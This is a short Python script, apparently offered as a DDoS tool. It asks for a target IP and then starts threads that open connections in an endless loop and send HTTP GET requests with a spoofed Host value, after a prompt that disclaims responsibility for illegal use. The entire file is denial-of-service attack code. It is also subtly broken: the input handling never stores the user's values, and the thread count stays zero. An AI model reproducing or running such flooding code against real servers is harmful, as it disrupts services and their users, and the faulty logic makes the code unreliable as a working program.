'''

@author: N/A
'''
import threading
import socket
from _ast import Not

target = ''
port = 80
fake_ip = '182.21.20.32'
runtimes = 0
runcount = 0
def config():
    print("Input target ip:")
    print("Changed target ip to:", input(target))
    print("Input how many times you want it send data:")
    print("Runtimes:", input(runtimes))
 
    print('Change port? y/n')
    if input(target) == 'y':
            port = ''
            print("Changed port to:", input(port))  
    print('Change fake ip? y/n')
    if input(target) == 'y':
            fake_ip = ''
            print("Changed fake ip to:", input(fake_ip))
            
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host:" + fake_ip + " r\n\r\n").encode('ascii'), (target,port))
        s.close()
        
        global runcount
        runcount += 1
        if runcount % 1000 == 0:
            print(runcount)
           
            
def mainDDos():
    print("Are you sure you want to attack? (creator is not responsible for any illegal use)")
    if input('(y/n):') == 'y':
        print('executing attack')
        runcount = 1
        for i in range(runtimes):
            thread = threading.Thread(target=attack)
            thread.start()  
        print("Successfull runs:", runcount)
            
    else:
        print('    1. Edit config, 2. end program')
        if input('(1/2):') == '1':
                config()
                mainDDos()
         
        


        
config()
mainDDos()
